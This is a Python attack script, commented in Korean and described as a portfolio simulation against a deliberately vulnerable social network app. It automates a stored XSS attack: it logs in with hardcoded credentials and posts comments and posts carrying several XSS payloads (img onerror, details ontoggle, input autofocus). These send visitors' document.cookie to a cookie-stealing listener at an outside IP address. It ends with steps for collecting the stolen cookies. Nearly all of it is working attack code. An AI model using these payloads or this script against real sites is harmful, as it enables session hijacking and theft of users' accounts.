#!/usr/bin/env python3
"""
Stored XSS Attack - Vulnerable SNS 게시물/댓글 공격
포트폴리오 목적: 실전형 Stored XSS 공격 시뮬레이션

공격 흐름:
1. 로그인 (alice/alice2024)
2. 댓글에 XSS 페이로드 주입 (필터링 없음!)
3. 피해자가 피드를 보면 쿠키 탈취됨
"""

import requests
import time
import sys
from new_payloads import NewPayloadGenerator

# 색상
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

class VulnerableSNSAttacker:
    """Vulnerable SNS XSS 자동 공격"""

    def __init__(self, base_url, listener_url, username='alice', password='alice2024'):
        self.base_url = base_url
        self.listener_url = listener_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def login(self):
        """로그인"""
        print(f"{Colors.BLUE}[*] 로그인 시도: {self.username}{Colors.END}")

        url = f"{self.base_url}/login.php"
        data = {
            'username': self.username,
            'password': self.password
        }

        try:
            response = self.session.post(url, data=data, allow_redirects=True, timeout=10)

            if 'index.php' in response.url or 'dashboard' in response.text.lower():
                print(f"{Colors.GREEN}✓ 로그인 성공!{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 로그인 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 로그인 오류: {e}{Colors.END}\n")
            return False

    def get_posts(self):
        """게시물 목록 가져오기"""
        print(f"{Colors.BLUE}[*] 게시물 목록 가져오는 중...{Colors.END}")

        url = f"{self.base_url}/index.php"

        try:
            response = self.session.get(url, timeout=10)
            # 간단하게 첫 번째 게시물 ID를 1로 가정
            # 실제로는 HTML 파싱 필요
            return [1, 2, 3]  # 임시로 게시물 ID 반환

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}")
            return []

    def post_comment(self, post_id, payload):
        """댓글에 XSS 페이로드 주입"""
        print(f"{Colors.YELLOW}[*] 댓글 작성 중... (Post ID: {post_id}){Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/add_comment.php"
        data = {
            'post_id': post_id,
            'content': payload
        }

        try:
            response = self.session.post(url, data=data, allow_redirects=True, timeout=10)

            if 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 댓글 작성 성공!{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}✗ 댓글 작성 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

    def post_new_post(self, payload):
        """게시물에 XSS 페이로드 주입"""
        print(f"{Colors.YELLOW}[*] 게시물 작성 중...{Colors.END}")
        print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")

        url = f"{self.base_url}/new_post.php"
        data = {
            'content': payload
        }

        try:
            response = self.session.post(url, data=data, allow_redirects=True, timeout=10)

            if 'index.php' in response.url or response.status_code == 200:
                print(f"{Colors.GREEN}✓ 게시물 작성 성공!{Colors.END}\n")
                return True
            elif '허용되지 않은' in response.text:
                print(f"{Colors.RED}✗ 차단됨: 허용되지 않은 태그{Colors.END}\n")
                return False
            else:
                print(f"{Colors.RED}✗ 게시물 작성 실패{Colors.END}\n")
                return False

        except Exception as e:
            print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")
            return False

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}🎯 Vulnerable SNS Stored XSS Attack{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    # 설정
    BASE_URL = "http://3.34.90.201"  # 서버 IP
    LISTENER_URL = "http://3.113.201.239:9999/steal"  # 쿠키 리스너
    USERNAME = "alice"
    PASSWORD = "alice2024"

    print(f"{Colors.BLUE}📡 Target: {BASE_URL}{Colors.END}")
    print(f"{Colors.BLUE}📡 Listener: {LISTENER_URL}{Colors.END}")
    print(f"{Colors.BLUE}👤 User: {USERNAME}{Colors.END}\n")

    # 공격자 인스턴스 생성
    attacker = VulnerableSNSAttacker(BASE_URL, LISTENER_URL, USERNAME, PASSWORD)

    # 페이로드 생성기
    gen = NewPayloadGenerator(LISTENER_URL)

    # 우선순위 페이로드 (댓글용 - 필터링 없음!)
    comment_payloads = [
        # Top 1: 기본 fetch
        f'<img/src=x/onerror=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # Top 2: new Image
        f'<img/src=x/onerror=new(Image).src="{LISTENER_URL}?c="+document.cookie>',

        # Top 3: location
        f'<img/src=x/onerror=location="{LISTENER_URL}?c="+document.cookie>',

        # Top 4: details
        f'<details/open/ontoggle=fetch("{LISTENER_URL}?c="+document.cookie)>',

        # Top 5: input autofocus
        f'<input/onfocus=fetch("{LISTENER_URL}?c="+document.cookie)/autofocus>',
    ]

    # 게시물용 페이로드 (script/iframe/object/embed 필터링)
    post_payloads = gen.slash_variants()[:3]

    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}공격 시작{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    # Step 1: 로그인
    if not attacker.login():
        print(f"{Colors.RED}❌ 로그인 실패. 종료합니다.{Colors.END}")
        sys.exit(1)

    # Step 2: 댓글 XSS 공격 (필터링 없음! - 가장 확실함)
    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📝 댓글 XSS 공격 (필터링 없음!){Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    success_count = 0
    for idx, payload in enumerate(comment_payloads, 1):
        print(f"{Colors.YELLOW}[{idx}/{len(comment_payloads)}]{Colors.END}")

        # 첫 번째 게시물(ID: 1)에 댓글 작성
        if attacker.post_comment(1, payload):
            success_count += 1
            print(f"{Colors.GREEN}✓ 페이로드 주입 성공! 피해자가 피드를 보면 쿠키가 탈취됩니다.{Colors.END}\n")
            break  # 하나만 성공하면 충분
        else:
            print(f"{Colors.RED}✗ 실패{Colors.END}\n")

        time.sleep(1)

    # Step 3: 게시물 XSS 공격 (script/iframe/object/embed 필터링)
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📄 게시물 XSS 공격 (일부 필터링 있음){Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    for idx, payload in enumerate(post_payloads, 1):
        print(f"{Colors.YELLOW}[{idx}/{len(post_payloads)}]{Colors.END}")

        if attacker.post_new_post(payload):
            success_count += 1
            print(f"{Colors.GREEN}✓ 게시물 주입 성공!{Colors.END}\n")
            break
        else:
            print(f"{Colors.RED}✗ 차단됨{Colors.END}\n")

        time.sleep(1)

    # 결과 요약
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 공격 결과{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    print(f"총 시도: {len(comment_payloads) + len(post_payloads)}")
    print(f"{Colors.GREEN}성공: {success_count}{Colors.END}")
    print(f"{Colors.RED}실패: {len(comment_payloads) + len(post_payloads) - success_count}{Colors.END}\n")

    if success_count > 0:
        print(f"{Colors.GREEN}{'='*80}{Colors.END}")
        print(f"{Colors.GREEN}✓ XSS 페이로드 주입 성공!{Colors.END}")
        print(f"{Colors.GREEN}{'='*80}{Colors.END}\n")
        print(f"{Colors.YELLOW}다음 단계:{Colors.END}")
        print(f"1. 피해자가 http://{BASE_URL}/index.php 접속")
        print(f"2. 쿠키가 자동으로 {LISTENER_URL}로 전송됨")
        print(f"3. 서버에서 'tail -f listener.log'로 쿠키 확인")
        print(f"4. 'cat stolen_cookies/cookie_*.json'으로 상세 정보 확인\n")

        print(f"{Colors.PURPLE}🎯 자신의 피드를 열어서 테스트하세요:{Colors.END}")
        print(f"   http://{BASE_URL}/index.php\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 공격 중단됨{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ 오류 발생: {e}{Colors.END}")
        sys.exit(1)
